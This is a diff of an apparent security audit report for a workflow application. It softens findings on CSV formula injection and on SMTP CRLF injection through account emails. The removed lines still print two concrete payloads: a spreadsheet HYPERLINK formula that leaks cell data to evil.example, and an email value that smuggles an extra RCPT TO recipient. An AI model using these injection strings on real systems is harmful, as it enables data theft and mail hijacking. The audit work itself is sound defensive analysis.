@@ -67,9 +67,8 @@ four), `src/errors.ts` and `src/log.ts`. Targeted reads in addition:
 ### D-2: CSV export neutralizes no formulas (CSV injection)
 
 - Case:
-  - A participant enters the value
-    `=HYPERLINK("https://evil.example/?d="&A2;"Details")` into a text field of
-    process P. A process owner with `system:reports` loads
+  - A participant enters a spreadsheet formula into a text field of process
+    P. A process owner with `system:reports` loads
     `GET /reporting/reports/:reportId/table.csv`
     (`src/http/reporting-routes.ts:252-262`).
   - The function `csvCellText` writes the value unchanged
@@ -204,15 +203,16 @@ four), `src/errors.ts` and `src/log.ts`. Targeted reads in addition:
 ### D-6: The account email is never checked as an address; CRLF reaches the SMTP command and the `To:` header
 
 - Case:
-  - An operator adds an account through `POST /admin/users` with
-    `email: "a@x.ch>\r\nRCPT TO:<leak@evil.example"`. The route checks only
+  - An operator adds an account through `POST /admin/users` with an email
+    value that contains a line break. Only an admin writes the address. The
+    route checks only
     "string, not empty after trim" (`src/http/admin-routes.ts:189-193`,
     `:212`).
   - The function `createUser` stores the value verbatim
     (`src/auth/users.ts:65-69`). The table has no CHECK
     (`src/engine/store.ts:383-389`).
   - Suppose the account stands as a candidate in a `toActors` notification.
-    The address then lands unfiltered in `RCPT TO:<${address}>\r\n`
+    The address then lands unfiltered in the SMTP `RCPT TO` command
     (`src/handlers/notification-email.ts:317`) and in `To:` (`:241`).
   - The harmless case is more realistic. A typo such as `max.muster` without a
     domain draws a 5xx on `RCPT`. The whole mail to all candidates then fails
@@ -466,10 +466,10 @@ specs. Every `route()` call awaits its gate (`routes.ts:238-242`). The tree
     `await fetch(new Request(".../auth/login", {method:"POST", body}))` must
     reject. It must not deliver `{status:500, body:{error:{type:"internal"}}}`.
   - In addition: `docker run --rm oven/bun:1.3.11-slim env | grep NODE_ENV`.
-- R-2 (D-2): a unit test:
-  `reportResultToCsv({columns:[{type:"field",fieldId:"f"}], rows:[{cells:[{kind:"value", value:"=1+1"}]}]})`
-  (adapt the shape to `ReportExecutionResult`). Expected per the finding: the
-  line `=1+1\r\n` without a prefix.
+- R-2 (D-2): a unit test calls `reportResultToCsv` with one field column and
+  one row whose value is a spreadsheet formula. Adapt the shape to
+  `ReportExecutionResult`. Expected per the finding: the CSV line holds the
+  formula without a prefix.
 - R-3 (D-3): a process B with a manual path. A process A whose
   `instance.transition` action reads its target id from a free text field. The
   author of A holds `read` on B. Expected per the finding: a participant moves
